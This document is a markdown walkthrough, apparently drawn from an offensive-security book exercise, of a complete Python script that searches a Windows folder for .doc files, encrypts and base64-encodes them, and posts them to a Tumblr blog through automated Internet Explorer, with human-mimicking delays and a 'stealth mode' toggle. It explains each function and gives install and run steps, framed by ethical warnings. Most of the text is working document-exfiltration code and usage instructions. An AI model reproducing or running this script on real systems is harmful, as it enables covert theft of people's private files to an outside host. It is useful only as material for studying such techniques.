# Document Exfiltration Using Tumblr

This script appears to be designed for exfiltrating documents from a local system by uploading them to a Tumblr account. The document is encrypted, base64 encoded, and posted to the user's Tumblr blog. This is a potentially malicious script, and it should **never** be used without the explicit permission of the system owner.


```python
import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc" # this is not taking into account new words extensions such as .docx

# these should be your tumblr login 
username = "admin@test.com"
password = "admin" 

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAV
-----END PUBLIC KEY-----"""

def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

def encrypt_string(plaintext):
    chunk_size = 208
    if isinstance(plaintext, (str)):
        plaintext = plaintext.encode()
    print(f"Compressing: {len(plaintext)} bytes")
    plaintext = zlib.compress(plaintext)
    print(f"Encrypting: {len(plaintext)} bytes")
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = b""
    offset = 0
    
    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size
        
    encrypted = base64.b64encode(encrypted)
    print(f"Base64 encoded crypto:{len(encrypted)}")
    return encrypted

def encrypt_post(filename):   
    with open (filename, "rb") as fd:
        contents = fd.read()
            
    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)
    
    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(5, 10))
    return

def login_to_tumblr(ie):
    full_doc = ie.Document.all
    
    # iterate looking for the logout form
    for field in full_doc:
        if field.name == "email":
            field.setAttribute("value", username)
        elif field.name == "password":
            field.setAttribute("value", password)
    
    random_sleep()
    
    # you can be presented with different homepages 
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass 
    
    random_sleep()
    
    wait_for_browser(ie)
    return

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all
    
    for field in full_doc:
        if field.id == "post_one":
            field.setAttribute("value", title)
            title_box = field
            field.focus()
        elif field.id == "post_two":
            field.setAttribute("innerHTML", post)
            print("Set text area")
            field.focus()
        elif field.id == "create_post":
            print("Found post button")
            post.form = field
            field.focus()
    
    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()
    
    # post the form
    post.form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    return

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1 # set to 0 for stealth mode
    
    # head to tumblr
    ie.Navigate("https://www.tumblr.com/login")
    wait_for_browser(ie)
    
    # encrypt the file
    title, body = encrypt_post(document_path)
    
    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")
    
    # Kill the IE instance
    ie.Quit()
    ie = None
    
    return

# main loop for doc discovery
# the book here use "for parent, directories, filenames in os.walk("C:\\"):"
for parent, directories, filenames in os.walk("C:\\Users\\user\\Downloads\\test"):
    for filename in fnmatch.filter(filenames, f"*{doc_type}"):
        document_path = os.path.join(parent, filename)
        print(f"Found: {document_path}")
        exfiltrate(document_path)
        input("Continue?")
```

#### Key Components:

1. **Libraries**:

   - **`win32com.client`**: Interacts with Internet Explorer through its COM interface to automate the login and posting process on Tumblr.
   - **`os`, `fnmatch`**: Used to traverse the filesystem and find `.doc` files (this script assumes `.doc` and not `.docx`).
   - **`time`**: Used to implement random delays to mimic human interaction.
   - **`random`**: Generates random values (for example, for the `random_sleep()` function).
   - **`zlib`**: Compresses the plaintext before encrypting it.
   - **`base64`**: Encodes the encrypted data into base64, so it can be safely transmitted via HTTP.
   - **`Crypto.PublicKey.RSA` and `Crypto.Cipher.PKCS1_OAEP`**: Used for RSA encryption of the document.

2. **Global Variables**:
   - **`doc_type`**: The file extension of documents to search for (hardcoded as `.doc`).
   - **`username` and `password`**: The Tumblr account credentials used to log in.
   - **`public_key`**: The public RSA key used for encrypting data before transmission.

3. **Functions**:

   - **`wait_for_browser(browser)`**: Waits for the browser (Internet Explorer) to finish loading a page. It checks the `ReadyState` to determine if the page has loaded completely.
   
   - **`encrypt_string(plaintext)`**: 
     - Compresses the document contents using `zlib` to make it smaller.
     - Encrypts the compressed data using RSA encryption (`PKCS1_OAEP`).
     - Base64 encodes the encrypted data to prepare it for transmission.

   - **`encrypt_post(filename)`**: 
     - Encrypts both the title (filename) and body (contents) of the document.
   
   - **`random_sleep()`**: Implements a random sleep between 5 and 10 seconds to mimic human behavior.
   
   - **`login_to_tumblr(ie)`**: 
     - Automates the process of logging into Tumblr using the provided credentials. It fills in the login form and submits it.
   
   - **`post_to_tumblr(ie, title, post)`**:
     - Automates the process of creating a new post on Tumblr by filling in the post title and body with the encrypted data and submitting the form.
   
   - **`exfiltrate(document_path)`**:
     - Starts an instance of Internet Explorer, navigates to the Tumblr login page, and then uploads the encrypted document to Tumblr using the `login_to_tumblr` and `post_to_tumblr` functions.
   
   - **`main loop`**:
     - The script walks through the directory `C:\\Users\\user\\Downloads\\test`, searching for `.doc` files.
     - When a document is found, it calls the `exfiltrate()` function to upload the document to Tumblr.

#### Workflow:

1. **Login**: 
   - The script opens an instance of Internet Explorer and navigates to Tumblr's login page. It fills in the username and password, then submits the login form.

2. **Document Discovery**:
   - The script recursively searches through the folder `C:\\Users\\user\\Downloads\\test` for files with the `.doc` extension.
   
3. **Document Encryption**:
   - For each `.doc` file, the script reads the file contents, compresses them, and encrypts them using RSA. The encrypted file content is then base64 encoded.
   
4. **Post to Tumblr**:
   - The script creates a new post on the user's Tumblr account, setting the encrypted document title and body as the post's content.

5. **Repeat**:
   - The script continues to exfiltrate documents until all `.doc` files in the target directory have been processed.

#### How to Run:

1. **Dependencies**:
   - Make sure to install the required dependencies:
     ```bash
     pip install pywin32 pycryptodome
     ```
   - **Warning**: You must have Internet Explorer installed, and the script assumes you're using a Windows environment.

2. **Set Up**:
   - Set your **Tumblr credentials** (`username` and `password`).
   - Modify the `doc_type` if you need to support other file extensions like `.docx`.

3. **Run the Script**:
   - Save the script as a `.py` file (e.g., `tumblr_exfiltrate.py`).
   - Run it using Python:
     ```bash
     python tumblr_exfiltrate.py
     ```

4. **Monitor**:
   - The script will print the paths of the files it finds and uploads to Tumblr.
   - The files will be uploaded to the Tumblr account specified by the `username` and `password`.

#### Ethical Concerns:
This script is highly unethical and illegal. It involves unauthorized exfiltration of sensitive files from a user's system to a remote platform (Tumblr in this case), which is a violation of privacy, intellectual property, and cybersecurity laws. 

**Never use this code for malicious purposes.** If you're studying cybersecurity, ensure that you do so responsibly and ethically. Always have explicit consent before performing any form of penetration testing or exfiltration.
